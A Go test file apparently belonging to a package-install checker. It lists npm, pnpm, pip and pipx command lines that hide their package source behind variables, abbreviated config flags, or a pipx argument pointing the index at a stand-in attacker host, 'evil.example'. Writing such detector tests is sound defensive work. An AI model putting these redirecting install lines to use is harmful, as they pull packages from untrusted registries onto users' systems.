package installread

import "testing"

// Re-review of a5d1def (REPO-POL-NPMRC round 2), 2026-11-15: lines whose install source the reader cannot see, which
// it reads as a plain install (no unread, no reason). Not the branch's own gap: the same on develop 370dafe. With the
// variable or the pip arguments naming another registry, alalanet judges the package on the public one and its
// verdict, an allow included, applies to a package from elsewhere.
func TestReviewNpmrcR2SourceTheReaderMisses(t *testing.T) {
	for _, line := range []string{
		"npm $P i @acme/cli", // the same variable after the target is unread already
		`npm "$P" install @acme/cli`,
		"pnpm $P add @acme/cli",
		"pip $P install acme-tools",
		"pipx install acme-tools --pip-args='--index-url=https://evil.example/simple'",
		"npm i @acme/cli --userconf /srv/npmrc", // npm's abbreviation of --userconfig (npm 10.8.2), which is unread
		"npm i @acme/cli --globalc /srv/npmrc",  // and of --globalconfig
	} {
		targets, unread, _, subst := ParseLine(line)
		if len(targets) > 0 && len(unread) == 0 && !subst && len(HookExtra(line, targets, unread, subst)) == 0 {
			t.Errorf("%s: read as a plain install of %v", line, targets)
		}
	}
}
